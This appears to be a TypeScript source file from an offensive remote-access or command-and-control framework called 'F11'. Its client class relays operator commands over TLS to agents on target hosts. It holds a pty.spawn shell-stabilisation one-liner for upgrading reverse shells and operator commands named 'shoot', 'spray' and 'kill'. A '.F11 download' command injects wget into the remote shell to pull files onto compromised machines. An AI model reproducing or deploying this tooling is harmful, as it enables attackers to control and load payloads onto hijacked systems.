import 'colors';
// import { Socket } from 'net';
import tls, { PeerCertificate, TLSSocket, TLSSocketOptions } from 'tls';
import { IF11Client } from './types';
import { F11Controller } from './Controller';
import { F11Relay } from './Relay';
import { F11Agent } from './Agent';

const STABALIZE = `python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null`;
// const STABALIZE = `python3 -c 'import pty; pty.spawn("/bin/snipe")' || python -c 'import pty; pty.spawn("/bin/snipe")' || script -qc /bin/snipe /dev/null`;

export class F11Client extends F11Relay implements IF11Client {
  public requireAuthorized = true;

  constructor(public ctl: F11Controller, public socket: TLSSocket, public quiet?: boolean) {
    super(ctl, socket, quiet ? undefined : ctl.prompt);
  }

  get docPath(): string {
    return `clients/${this.id}`;
  }

  public init(): void {
    super.init(['hosts', 'shoot', 'spray', 'shootin', 'sprayin', 'ls', 'use', 'kill']);
    this.on('reset', this.showPrompt.bind(this));
  }

  public data(data: any): void {
    if (this.quiet) {
      this.log.info(`QUIET DATA: ${data}`);
      if (this.client) {
        this.client.write(data);
      }
    } else if (this.relay && /^ *\.F11 +/.test(data.toString())) {
      const [cmd, ...args] = data.toString().replace(/^ *\.F11 +/, '').split(' ').map(p => p.trim());

      if (/download/.test(cmd)) {
        this.log.warn(`.F11 - DOWNLOAD: ${data}`);
        super.data(`wget ${args[0]}\n`);
      } else {
        this.log.warn(`.F11 - UNKNOWN: ${data}`);
        super.data(`\n`);
      }

      // super.data(`.F11 ${data}`);
    } else {
      const body = data.toString().trim();
      const lines = body.split(`\n`);
      let skip = false;

      lines.forEach(line => {
        if (!this.relay) {
          return;
        };

        const agent = this.relay as F11Agent;

        if (/^ *(stable|stabalise|stabalize) *$/i.test(line)) {
          agent.stable();
          skip = true;
        }
      });

      if (!skip) {
        super.data(data);

        // TODO: Better sync control flow for dynamic agent prompts (without stable)
        // if (this.relay && !lines.find(l => this.commands.includes(l.trim().split(' ')[0])) && this.relay instanceof F11Agent && !this.relay.stablized) {
        //   this.relay.updateSig('Client.data()');
        // }
      }
    }
  }

  public start(): void {
    this.log.info(`Starting F11Client...`);

    // this.signature = `f11:client`;

    // this.socket = tls.connect(
    //   { ...this.ctl.tlsOptions('client'), host: this.ctl.host, port: this.ctl.clientPort },
    //   () => {
    //     this.log.info(`F11Client connected to controller: ${this.ctl.host}:${this.ctl.clientPort}`);
    //     this.init();
    //     this.write(`reg ${this.signature}`);
    //   }
    // );
  }

  public authorize(client: F11Relay, key: Buffer | string, cert: Buffer | string): Promise<string | null> {
    this.client = client;
    // this.signature = `f11:client`;

    const tlsOptions: TLSSocketOptions = {
      key,
      cert,
      requestCert: true,
      rejectUnauthorized: false
    };

    return new Promise((resolve) => {
      try {
        this.socket = tls.connect({ ...tlsOptions, host: this.ctl.host, port: this.ctl.clientPort }, () => {
          this.log.info(`F11Client connected to controller: ${this.ctl.host}:${this.ctl.clientPort}`);

          const cert = this.socket.getCertificate() as PeerCertificate;

          this.signature = cert.subject?.CN;

          this.init();
          // this.reg(this.signature);
          this.write(`reg ${this.signature}`);
          resolve(this.signature);
        });
      } catch (err) {
        this.log.error(err);
        resolve(null);
      }
    });
  }
}
